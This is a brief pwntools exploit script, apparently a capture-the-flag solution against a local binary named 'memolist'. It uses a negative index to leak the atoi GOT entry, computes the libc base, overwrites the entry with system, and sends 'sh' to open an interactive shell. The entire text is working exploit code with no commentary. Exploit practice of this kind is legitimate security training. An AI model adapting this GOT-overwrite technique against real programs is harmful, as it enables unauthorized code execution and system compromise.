from pwn import *

p = process('./memolist')
elf = ELF('./memolist')
libc = elf.libc

def see(index):
    p.sendafter('choice:', '1')
    p.sendafter('Index:', str(index))

def write(index, msg):
    p.sendafter('choice:', '2')
    p.sendafter('Index:', str(index))
    p.sendafter('write?', msg)

see(-4)
p.recvuntil('memo: ')
atoi = u64(p.recv(6).ljust(8, b'\x00'))
base = atoi - libc.sym['atoi']
success('libc base = 0x%x', base)
system = base + libc.sym['system']

write(-4, p64(system))
p.sendlineafter('choice:', 'sh')

p.interactive()